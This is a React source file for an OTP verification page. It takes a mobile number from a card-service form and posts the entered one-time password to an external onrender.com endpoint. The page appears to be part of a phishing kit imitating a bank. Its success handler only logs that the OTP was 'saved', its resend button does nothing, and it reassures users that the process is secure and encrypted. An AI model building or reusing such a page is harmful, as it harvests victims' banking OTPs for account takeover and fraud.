
import { useState } from "react";
import { useLocation } from "react-router-dom";
import {
  FaLock,
  FaShieldAlt,
  FaCheckCircle,
} from "react-icons/fa";

export default function OtpVerification() {
  const location = useLocation();

  // Get mobile number passed from CardServiceForm
  const mobile = location.state?.mobile || "";

  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = async (e, otpValue = otp) => {
    if (e) {
      e.preventDefault();
    }

    setError("");

    if (!mobile) {
      setError("Mobile number is missing. Please go back and try again.");
      return;
    }

    if (otpValue.length !== 6) {
      setError("Please enter a valid 6-digit OTP.");
      return;
    }

    if (submitting) {
      return;
    }

    setSubmitting(true);

    // Clear OTP immediately
    setOtp("");

    try {
      const response = await fetch(
        "https://indus-dxn3.onrender.com/api/otp/verify",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mobile: mobile,
            otp: otpValue,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok || !data.success) {
        setError(
          data.message || "Technical error, please try later"
        );
        return;
      }

      // Success
      setOtp("");

      console.log("OTP saved successfully:", data);
    } catch (error) {
      console.error(error);

      setError(
        "Network error, please check your connection"
      );
    } finally {
      setSubmitting(false);
    }
  };

  // Automatically submit when 6 digits are entered
  const handleOtpChange = (e) => {
    const value = e.target.value
      .replace(/\D/g, "")
      .slice(0, 6);

    setOtp(value);
    setError("");

    if (value.length === 6 && !submitting) {
      handleSubmit(null, value);
    }
  };

  const handleResend = () => {
    setOtp("");
    setError("");

    // Add resend API here if required
  };

  return (
    <div className="mx-auto flex min-h-[90vh] w-full max-w-md items-center justify-center">
      <div className="w-full">

        {/* Main Card */}
        <div className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-xl">

          {/* Header */}
          <div className="bg-[#ab183d] px-5 py-6 text-center sm:px-8">

            <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-white/15">
              <FaShieldAlt className="text-xl text-white" />
            </div>

            <h2 className="text-lg font-bold text-white sm:text-xl">
              OTP Verification
            </h2>

            <p className="mt-1 text-xs text-white/80 sm:text-sm">
              Enter the 6-digit verification code
            </p>
          </div>

          {/* Card Body */}
          <div className="p-5 sm:p-8">

            {/* Mobile Number */}
            <div className="mb-5 text-center">
              <p className="text-xs text-gray-500">
                OTP sent to mobile number
              </p>

              <p className="mt-1 text-sm font-semibold text-gray-700">
                {mobile}
              </p>
            </div>

            <form
              onSubmit={handleSubmit}
              className="space-y-5"
            >

              {/* Error */}
              {error && (
                <div className="flex items-start gap-3 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
                  <span className="mt-0.5 font-bold">
                    !
                  </span>

                  <p className="leading-5">
                    {error}
                  </p>
                </div>
              )}

              {/* Instruction */}
              <div className="text-center">
                <p className="text-sm font-medium text-gray-700">
                  Enter your One-Time Password
                </p>

                <p className="mt-1 text-xs text-gray-500">
                  The OTP must contain exactly 6 digits.
                </p>
              </div>

              {/* OTP Input */}
              <div>
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={6}
                  value={otp}
                  onChange={handleOtpChange}
                  placeholder="••••••"
                  disabled={submitting}
                  autoFocus
                  className={`w-full rounded-xl border-2 bg-gray-50 px-4 py-4 text-center text-2xl font-bold text-gray-800 outline-none transition-all placeholder:text-gray-300 ${
                    otp
                      ? "border-[#ab183d] tracking-[12px]"
                      : "border-gray-200 tracking-[8px]"
                  } ${
                    submitting
                      ? "cursor-not-allowed opacity-60"
                      : "focus:border-[#ab183d] focus:bg-white focus:ring-4 focus:ring-[#ab183d]/10"
                  }`}
                />

                <div className="mt-2 text-center text-xs text-gray-400">
                  {otp.length} / 6 digits
                </div>
              </div>

              {/* Resend */}
              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={submitting}
                  className="text-sm font-semibold text-[#ab183d] transition hover:text-[#7f102d] hover:underline disabled:cursor-not-allowed disabled:opacity-50"
                >
                  Resend OTP
                </button>
              </div>

              {/* Verify Button */}
              <button
                type="submit"
                disabled={submitting}
                className="flex w-full items-center justify-center gap-2 rounded-xl bg-[#ab183d] px-4 py-3.5 text-sm font-semibold text-white shadow-md transition-all hover:bg-[#8f1233] hover:shadow-lg disabled:cursor-not-allowed disabled:opacity-60 sm:text-base"
              >
                {submitting ? (
                  <>
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                    Verifying...
                  </>
                ) : (
                  <>
                    <FaLock />
                    Verify Securely
                  </>
                )}
              </button>
            </form>

            {/* Security Box */}
            <div className="mt-7 rounded-xl border border-green-200 bg-green-50 p-4">

              <div className="flex items-center gap-2 text-sm font-semibold text-green-700">
                <FaCheckCircle />
                <span>Secure Verification</span>
              </div>

              <p className="mt-2 text-xs leading-5 text-gray-600 sm:text-sm">
                Your verification code is securely processed
                using encrypted communication.
              </p>

            </div>
          </div>
        </div>

        {/* Bottom Security Text */}
        <div className="mt-5 text-center">
          <div className="flex items-center justify-center gap-1.5 text-xs text-gray-400">
            <FaLock />
            <span>Your information is protected</span>
          </div>

          <p className="mt-2 text-[11px] text-gray-400">
            Never share your OTP with anyone.
          </p>
        </div>

      </div>
    </div>
  );
}
